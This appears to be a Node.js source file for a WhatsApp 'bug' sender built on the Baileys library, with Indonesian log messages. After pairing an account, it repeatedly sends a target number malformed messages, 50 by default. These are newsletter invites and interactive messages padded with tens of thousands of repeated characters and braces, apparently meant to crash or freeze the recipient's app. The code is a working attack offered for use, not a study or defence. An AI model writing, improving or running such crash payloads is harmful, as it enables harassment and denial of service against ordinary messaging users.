const {
  makeWASocket,
  prepareWAMessageMedia,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  proto,
  delay,
  relayWAMessage,
  getContentType,
  jidDecode,
  fetchLatestBaileysVersion
} = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');
const fs = require('fs-extra');
const path = require('path');

class WhatsAppService {
    constructor() {
        this.sock = null;
        this.pairingCode = null;
        this.isConnected = false;
        this.authPath = path.join(__dirname, '../session');
        this.phoneNumber = null;
        this.isInitializing = false;
        this.ensureAuthDir();
    }

    ensureAuthDir() {
        if (!fs.existsSync(this.authPath)) {
            fs.mkdirSync(this.authPath, { recursive: true });
        }
    }

    async initialize(phoneNumber) {
        if (this.isInitializing) {
            console.log('Already initializing...');
            return;
        }

        try {
            this.isInitializing = true;
            this.phoneNumber = phoneNumber;
            
            const { state, saveCreds } = await useMultiFileAuthState(this.authPath);
            const { version, isLatest } = await fetchLatestBaileysVersion();
            
            console.log(`Using Baileys version: ${version}, isLatest: ${isLatest}`);
            
            this.sock = makeWASocket({
                logger: require('pino')({ level: 'silent' }),
                printQRInTerminal: false,
                auth: state,
                browser: ["Ubuntu", "Chrome", "20.0.04"],
                version: version
            });

            this.setupEventHandlers(saveCreds);

            await delay(2000);

            if (!state.creds?.registered && phoneNumber) {
                console.log('Device not registered, requesting pairing code...');
                this.pairingCode = await this.sock.requestPairingCode(phoneNumber, "NOCTURNE");
                console.log(`Pairing code for ${phoneNumber}: ${this.pairingCode}`);
            }

        } catch (error) {
            console.error('WhatsApp initialization error:', error);
            throw error;
        } finally {
            this.isInitializing = false;
        }
    }

    setupEventHandlers(saveCreds) {
        this.sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update;
            
            if (connection === 'close') {
                let reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
                
                if (reason === DisconnectReason.badSession) {
                    console.log('Bad Session File, Please Delete session and Scan Again');
                    await this.clearSession();
                } else if (reason === DisconnectReason.connectionClosed) {
                    console.log('Connection closed, reconnecting....');
                    setTimeout(() => this.initialize(this.phoneNumber), 3000);
                } else if (reason === DisconnectReason.connectionLost) {
                    console.log('Connection Lost from Server, reconnecting...');
                    setTimeout(() => this.initialize(this.phoneNumber), 3000);
                } else if (reason === DisconnectReason.connectionReplaced) {
                    console.log('Connection Replaced, Another New Session Opened, Please Close Current Session First');
                } else if (reason === DisconnectReason.loggedOut) {
                    console.log('Device Logged Out, Please Scan Again And Run.');
                    await this.clearSession();
                } else if (reason === DisconnectReason.restartRequired) {
                    console.log('Restart Required, Restarting...');
                    setTimeout(() => this.initialize(this.phoneNumber), 3000);
                } else if (reason === DisconnectReason.timedOut) {
                    console.log('Connection TimedOut, Reconnecting...');
                    setTimeout(() => this.initialize(this.phoneNumber), 3000);
                } else if (reason === DisconnectReason.Multidevicemismatch) {
                    console.log('Multi device mismatch, please scan again');
                    await this.clearSession();
                } else {
                    console.log('Unknown DisconnectReason: ' + reason + '|' + connection);
                    setTimeout(() => this.initialize(this.phoneNumber), 3000);
                }
                
                this.isConnected = false;
                this.pairingCode = null;
                
            } else if (connection === 'open') {
                console.log('WhatsApp connection opened successfully');
                this.isConnected = true;
                this.pairingCode = null;
            }
        });

        this.sock.ev.on('creds.update', saveCreds);
        
        this.sock.ev.on('messages.upsert', (m) => {
           
        });
    }

    async clearSession() {
        try {
            if (fs.existsSync(this.authPath)) {
                await fs.emptyDir(this.authPath);
                console.log('Session cleared');
            }
        } catch (error) {
            console.error('Error clearing session:', error);
        }
    }

    async requestPairingCode(phoneNumber) {
        if (this.isConnected) {
            throw new Error('WhatsApp sudah terhubung');
        }
        
        if (!phoneNumber) {
            throw new Error('Nomor telepon diperlukan untuk pairing code');
        }
        
        const cleanNumber = phoneNumber.replace(/\D/g, '');
        
        try {
            if (!this.sock) {
                await this.initialize(cleanNumber);
                await delay(3000);
            }
            
            return this.pairingCode;
        } catch (error) {
            console.error('Pairing code request error:', error);
            throw error;
        }
    }

    getConnectionStatus() {
        return {
            connected: this.isConnected,
            hasPairingCode: !!this.pairingCode,
            pairingCode: this.pairingCode,
            phoneNumber: this.phoneNumber,
            isInitializing: this.isInitializing
        };
    }

    async sendMessage(target, version, customMessage, count = 50, delayMs = 1000) {
        if (!this.isConnected) {
            throw new Error('WhatsApp belum terhubung. Silakan masukkan kode pairing terlebih dahulu.');
        }

        try {
            let phoneNumber = target.replace(/\D/g, '');
            if (!phoneNumber.startsWith('62')) {
                if (phoneNumber.startsWith('0')) {
                    phoneNumber = '62' + phoneNumber.slice(1);
                } else {
                    phoneNumber = '62' + phoneNumber;
                }
            }
            phoneNumber += '@s.whatsapp.net';

            const messageFunctions = {
                v1: () => this.ClickStep(phoneNumber),
                v2: () => this.ClickStep(phoneNumber),
                v3: () => this.ClickStep(phoneNumber)
            };

            const messageFunction = messageFunctions[version] || messageFunctions.v1;

            for (let i = 1; i <= count; i++) {
                try {
                    await messageFunction();
                    console.log(`[${i}/${count}] Bug terkirim ke ${phoneNumber}`);
                    if (i < count) await delay(delayMs);
                } catch (err) {
                    console.error(`Gagal kirim bug ke-${i}:`, err.message);
                }
            }

            return {
                success: true,
                message: `${count} pesan bug berhasil dikirim`,
                target: phoneNumber,
                version: version,
                sentAt: new Date().toISOString()
            };

        } catch (error) {
            console.error('Send message error:', error);
            return {
                success: false,
                message: `Gagal kirim pesan: ${error.message}`
            };
        }
    }

// ғᴜɴᴄᴛɪᴏɴ ʙᴜɢ

    async ClickStep(isTarget) {
        try {
            const msgi = {
                newsletterAdminInviteMessage: {
                    newsletterJid: "1@newsletter",
                    newsletterName: "7ooModdss" + "ោ៝".repeat(20000),
                    caption: "7ooModds" + "FVerse" + "ោ៝".repeat(20000),
                    inviteExpiration: "999999999",
                },
            };

            await this.sock.relayMessage(isTarget, msgi, {
                participant: { jid: isTarget },
                messageId: null,
            });
            
            const SQL = JSON.stringify({
                status: true,
                criador: "JooModds",
                resultado: {
                    type: "md",
                    ws: {
                        _events: { "CB:ib,,dirty": ["Array"] },
                        _eventsCount: 800000,
                        _maxListeners: 0,
                        url: "wss://web.whatsapp.com/ws/chat",
                        config: {
                            version: ["Array"],
                            browser: ["Array"],
                            waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                            sockCectTimeoutMs: 20000,
                            keepAliveIntervalMs: 30000,
                            logger: {},
                            printQRInTerminal: false,
                            emitOwnEvents: true,
                            defaultQueryTimeoutMs: 60000,
                            customUploadHosts: [],
                            retryRequestDelayMs: 250,
                            maxMsgRetryCount: 5,
                            fireInitQueries: true,
                            auth: { Object: "authData" },
                            markOnlineOnsockCect: true,
                            syncFullHistory: true,
                            linkPreviewImageThumbnailWidth: 192,
                            transactionOpts: { Object: "transactionOptsData" },
                            generateHighQualityLinkPreview: false,
                            options: {},
                            appStateMacVerification: { Object: "appStateMacData" },
                            mobile: true
                        }
                    }
                }
            });

            const msg = await generateWAMessageFromContent(
                isTarget,
                {
                    viewOnceMessage: {
                        message: {
                            interactiveMessage: {
                                contextInfo: {
                                    expiration: 1,
                                    ephemeralSettingTimestamp: 1,
                                    entryPointConversionSource: "WhatsApp.com",
                                    entryPointConversionApp: "WhatsApp",
                                    entryPointConversionDelaySeconds: 1,
                                    disappearingMode: {
                                        initiatorDeviceJid: isTarget,
                                        initiator: "INITIATED_BY_OTHER",
                                        trigger: "UNKNOWN_GROUPS"
                                    },
                                    participant: "0@s.whatsapp.net",
                                    remoteJid: "status@broadcast",
                                    mentionedJid: [isTarget],
                                    quotedMessage: {
                                        paymentInviteMessage: {
                                            serviceType: 1,
                                            expiryTimestamp: null
                                        }
                                    },
                                    externalAdReply: {
                                        showAdAttribution: false,
                                        renderLargerThumbnail: true
                                    }
                                },
                                body: {
                                    text: "7ooModdss \n" + "ꦾ".repeat(50000)
                                },
                                nativeFlowMessage: {
                                    messageParamsJson: SQL + "{".repeat(1000),
                                    buttons: [
                                        {
                                            name: "single_select",
                                            buttonParamsJson: SQL + "{".repeat(20000)
                                        },
                                        {
                                            name: "review_and_pay",
                                            buttonParamsJson: SQL + "{".repeat(20000)
                                        },
                                        {
                                            name: "call_permission_request",
                                            buttonParamsJson: SQL + "{".repeat(20000)
                                        }
                                    ]
                                }
                            }
                        }
                    }
                },
                {}
            );

            await this.sock.relayMessage(isTarget, msg.message, {
                participant: { jid: isTarget },
                messageId: msg.key.id
            });
        } catch (error) {
            console.error('ClickStep error:', error);
            throw error;
        }
    }
} 

module.exports = WhatsAppService;